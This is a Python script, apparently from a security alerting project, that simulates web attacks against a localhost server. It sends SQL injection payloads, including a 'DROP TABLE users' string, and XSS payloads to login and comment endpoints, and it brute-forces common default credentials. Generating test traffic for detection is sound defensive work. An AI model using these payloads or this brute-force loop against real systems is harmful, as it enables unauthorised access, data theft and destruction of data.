import requests
import random
import time
import logging

logger = logging.getLogger("AlertForgeSimulator")

TARGET_URL = "http://localhost:5001"

class AttackSimulator:
    def __init__(self):
        self.session = requests.Session()

    def run_sql_injection(self):
        payloads = [
            "' OR '1'='1",
            "admin' --",
            "UNION SELECT null, username, password FROM users--",
            "1'; DROP TABLE users--"
        ]
        
        results = []
        for payload in payloads:
            try:
                # Simulate login attempt
                res = self.session.post(f"{TARGET_URL}/login", data={"username": payload, "password": "password"})
                results.append(f"Payload: {payload} -> Status: {res.status_code}")
                time.sleep(0.5)
            except Exception as e:
                results.append(f"Error: {str(e)}")
        
        return results

    def run_xss_storm(self):
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:/*--></title></style></textarea></script><script>alert(1)//"
        ]
        
        results = []
        for _ in range(5):
            payload = random.choice(payloads)
            try:
                # Simulate comment post
                res = self.session.post(f"{TARGET_URL}/submit", data={"comment": payload})
                results.append(f"Injected XSS: {payload[:20]}... -> Status: {res.status_code}")
                time.sleep(0.3)
            except Exception as e:
                results.append(f"Error: {str(e)}")
        
        return results

    def run_brute_force(self):
        usernames = ["admin", "root", "user", "guest"]
        passwords = ["123456", "password", "qwerty", "admin123"]
        
        results = []
        for _ in range(10):
            u = random.choice(usernames)
            p = random.choice(passwords)
            try:
                 res = self.session.post(f"{TARGET_URL}/login", data={"username": u, "password": p})
                 results.append(f"Brute Force: {u}:{p} -> Status: {res.status_code}")
                 time.sleep(0.2)
            except Exception as e:
                 results.append(f"Error: {str(e)}")
        
        return results
